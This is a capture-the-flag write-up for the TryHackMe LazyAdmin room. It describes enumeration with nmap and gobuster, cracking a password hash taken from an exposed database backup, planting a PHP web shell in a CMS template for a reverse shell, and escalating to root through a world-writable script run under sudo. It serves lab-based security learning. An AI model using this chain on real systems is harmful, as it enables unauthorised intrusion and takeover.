# TryHackMe-LazyAdmin-ctf-writeup

Writeup for Lazy Admin CTF available on https://www.tryhackme.com/ (https://www.tryhackme.com/room/lazyadmin)

Aliases:

VICTIM_IP = IP of deployed machine
MY_IP = My IP on TryHackMe VPN

## Information gathering

Nmap syn scan on host:

`nmap -A -Ss VICTIM_IP -oN nmap_syn_def`

Significant results:

PORT 22 -> OPEN, ssh
PORT 80 -> 80 Apache httpd 2.4.18 (Ubuntu)

Visiting VICTIM_IP:80 you can see the classic welcome page, no hints hidden in sourcecode

Gobuster scan on VICTIM_IP/ using dirb's wordlist "common.txt"

`gobuster dir -x php -u VICTIM_IP -w /usr/share/dirb/wordlists/common.txt`

Significant results:

/content

Visiting VICTIM_IP/content we find they are using a CMS called SweetRice, and states: 

"If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website."

Gobuster scan on VICTIM_IP:80 starting from /content

`gobuster dir -x php -u VICTIM_IP -w /usr/share/dirb/wordlists/common.txt`

Significant results:

/_themes
/as
/attachment
/images              
/inc                  
/index.php        
/index.php             
/js  

/as turns out to be a login page, wich I tried to bruteforce using hydra (with username "admin") with no success.

In /inc we find a mysql backup (http://VICTIM_IP/content/inc/mysql_backup/), download and open its content.

There is an INSERT sql statement wich declares a username (manager) and his password md5, you can just crack it on crackstation.

## Gaining first access

Using the credentials from the previous step you can manage to log in the cms. In the dashboard tab we see the button that "opens" the site.
Further looking, you can see a "theme" tab wich allow you modify the template of pages, including the home page.

At this point you can just add a php webshell in the home template and open the site.

If you're using kali you can a find a php webshell in /usr/share/webshells/ or you can just find one on the web, it is usually a php script wich only requires you to insert you ip and a port you'll be listening on.

Once you've inserted the webshell in the template start a nc listener on the port you indicated, start the site and visit /VICTIM_IP/content, you have gained a shell.

Using "find" you can easily locate the user.txt file, for root.txt we probably need to gain root privileges.

##Privilege escalation

Checking permissions on victims host:

`sudo -l`

Result: 

(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

It means we can run that script with sudo permission without being asked for a password. 

`cat /home/itguy/backup.pl`

Ouput:

system("sh", "/etc/copy.sh");

So the script is just calling a shell script

`cat /etc/copy.sh`

It's very useful to check this script permissions: 

`ls -la /etc/copy.sh`

Ouput:

-rw-r--rwx 1 root root 34 Jun 26 16:53 /etc/copy.sh

It means you can modify the script and execute is as sudo. From this point you can basically use this as you want, what I've done is:

`echo 'find / -name root.txt 2>x/dev/null' > /etc/copy.sh`

`sudo perl /home/itguy/backup.pl`

output:

/root/root.txt

`echo 'cat /root/root.txt' > copy.sh`

`sudo perl /home/itguy/backup.pl`

Output:

<root flag>
  
